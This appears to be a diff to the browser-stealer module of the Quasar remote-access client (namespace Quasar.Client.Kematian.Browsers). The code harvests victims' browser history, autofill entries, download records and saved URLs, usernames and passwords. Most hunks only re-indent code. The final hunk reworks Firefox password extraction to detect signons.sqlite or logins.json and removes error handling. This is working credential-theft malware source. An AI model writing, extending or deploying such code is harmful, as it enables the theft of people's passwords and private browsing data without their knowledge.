@@ -11,6 +11,7 @@ using Quasar.Client.Kematian.Browsers.Helpers.Structs;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Threading.Tasks;
 
 namespace Quasar.Client.Kematian.Browsers
@@ -102,12 +103,12 @@ namespace Quasar.Client.Kematian.Browsers
                     foreach (var entry in history)
                     {
                         var newEntry = new Dictionary<string, string>
-                        {
-                            {"Url", entry.Url},
-                            {"Title", entry.Title},
-                            {"VisitCount", entry.VisitCount},
-                            {"Date Last Viewed", entry.LastVisitTime}
-                        };
+                            {
+                                {"Url", entry.Url},
+                                {"Title", entry.Title},
+                                {"VisitCount", entry.VisitCount},
+                                {"Date Last Viewed", entry.LastVisitTime}
+                            };
                         result.Add(newEntry);
                     }
                 }
@@ -130,12 +131,12 @@ namespace Quasar.Client.Kematian.Browsers
                     foreach (var entry in history)
                     {
                         var newEntry = new Dictionary<string, string>
-                        {
-                            {"Url", entry.Url},
-                            {"Title", entry.Title},
-                            {"VisitCount", entry.VisitCount},
-                            {"Date Last Viewed", entry.LastVisitTime}
-                        };
+                            {
+                                {"Url", entry.Url},
+                                {"Title", entry.Title},
+                                {"VisitCount", entry.VisitCount},
+                                {"Date Last Viewed", entry.LastVisitTime}
+                            };
                         result.Add(newEntry);
                     }
                 }
@@ -194,14 +195,14 @@ namespace Quasar.Client.Kematian.Browsers
                     foreach (var entry in autoFillData)
                     {
                         var newEntry = new Dictionary<string, string>
-                        {
-                            {"Name", entry.Name},
-                            {"Value", entry.Value},
-                            {"Value_lower", entry.Value_lower},
-                            {"Date_created", entry.Date_created},
-                            {"Date_last_used", entry.Date_last_used},
-                            {"Count", entry.Count}
-                        };
+                            {
+                                {"Name", entry.Name},
+                                {"Value", entry.Value},
+                                {"Value_lower", entry.Value_lower},
+                                {"Date_created", entry.Date_created},
+                                {"Date_last_used", entry.Date_last_used},
+                                {"Count", entry.Count}
+                            };
                         result.Add(newEntry);
                     }
                 }
@@ -315,22 +316,22 @@ namespace Quasar.Client.Kematian.Browsers
                     foreach (var entry in downloads)
                     {
                         var newEntry = new Dictionary<string, string>
-                        {
-                            {"CurrentPath", entry.Current_path },
-                            {"TargetPath", entry.Target_path },
-                            {"StartTime", entry.Start_time },
-                            {"ReceivedBytes", entry.Received_bytes },
-                            {"TotalBytes", entry.Total_bytes },
-                            {"DangerType", entry.Danger_type },
-                            {"EndTime", entry.End_time },
-                            {"Opened", entry.Opened },
-                            {"LastAccessTime", entry.Last_access_time },
-                            {"Referrer", entry.Referrer },
-                            {"TabUrl", entry.Tab_url },
-                            {"TabReferrerUrl", entry.Tab_referrer_url },
-                            {"MimeType", entry.Mime_type },
-                            {"OriginalMimeType", entry.Original_mime_type }
-                        };
+                            {
+                                {"CurrentPath", entry.Current_path },
+                                {"TargetPath", entry.Target_path },
+                                {"StartTime", entry.Start_time },
+                                {"ReceivedBytes", entry.Received_bytes },
+                                {"TotalBytes", entry.Total_bytes },
+                                {"DangerType", entry.Danger_type },
+                                {"EndTime", entry.End_time },
+                                {"Opened", entry.Opened },
+                                {"LastAccessTime", entry.Last_access_time },
+                                {"Referrer", entry.Referrer },
+                                {"TabUrl", entry.Tab_url },
+                                {"TabReferrerUrl", entry.Tab_referrer_url },
+                                {"MimeType", entry.Mime_type },
+                                {"OriginalMimeType", entry.Original_mime_type }
+                            };
                         result.Add(newEntry);
                     }
                 }
@@ -406,11 +407,11 @@ namespace Quasar.Client.Kematian.Browsers
                     foreach (var entry in passwords)
                     {
                         var newEntry = new Dictionary<string, string>
-                        {
-                            {"Url", entry.Url},
-                            {"Username", entry.Username},
-                            {"Password", entry.Password}
-                        };
+                            {
+                                {"Url", entry.Url},
+                                {"Username", entry.Username},
+                                {"Password", entry.Password}
+                            };
                         result.Add(newEntry);
                     }
                 }
@@ -425,29 +426,37 @@ namespace Quasar.Client.Kematian.Browsers
         private List<Dictionary<string, string>> GetGeckoPasswordsForProfile(GeckoProfile profile)
         {
             var result = new List<Dictionary<string, string>>();
-            try
-            {
-                if (profile.LoginsJson != null && System.IO.File.Exists(profile.LoginsJson))
-                {
-                    var geckoLogins = new PasswordsGecko();
-                    var passwords = geckoLogins.GetLogins(profile.Path, profile.LoginsJson);
-                    geckoLogins.Dispose();
+            bool signonsFound = false;
+            bool loginsFound = false;
 
-                    foreach (var entry in passwords)
-                    {
-                        var newEntry = new Dictionary<string, string>
-                        {
+            string[] files = Directory.GetFiles(profile.Path, "signons.sqlite");
+            if (files.Length > 0)
+            {
+                signonsFound = true;
+            }
+
+            files = Directory.GetFiles(profile.Path, "logins.json");
+            if (files.Length > 0)
+            {
+                loginsFound = true;
+            }
+
+            if (loginsFound || signonsFound)
+            {
+                var geckoLogins = new PasswordsGecko();
+                var passwords = geckoLogins.GetLogins(profile.Path, profile.LoginsJson);
+                geckoLogins.Dispose();
+
+                foreach (var entry in passwords)
+                {
+                    var newEntry = new Dictionary<string, string>
+                            {
                             {"Url", entry.Url},
                             {"Username", entry.Username},
                             {"Password", entry.Password}
-                        };
-                        result.Add(newEntry);
-                    }
+                            };
+                    result.Add(newEntry);
                 }
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Error processing Gecko passwords for profile {profile.Name}: {ex.Message}");
             }
             return result;
         }
